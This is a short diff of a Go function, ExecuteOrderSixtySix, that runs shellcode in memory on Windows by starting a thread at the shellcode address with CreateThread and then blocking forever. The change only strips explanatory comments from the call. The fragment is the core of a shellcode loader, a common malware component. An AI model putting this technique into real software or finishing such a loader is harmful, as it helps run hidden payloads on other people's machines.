@@ -44,14 +44,13 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 		uintptr(len(shellcode)),
 	)
 
-	// jump to shellcode
 	_, _, _ = CreateThread.Call(
-		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
-		0,    // [in]            SIZE_T                  dwStackSize,
-		addr, // shellcode address
-		0,    // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
-		0,    // [in]            DWORD                   dwCreationFlags,
-		0,    // [out, optional] LPDWORD                 lpThreadId
+		0,
+		0,
+		addr,
+		0,
+		0,
+		0,
 	)
 
 	select {}
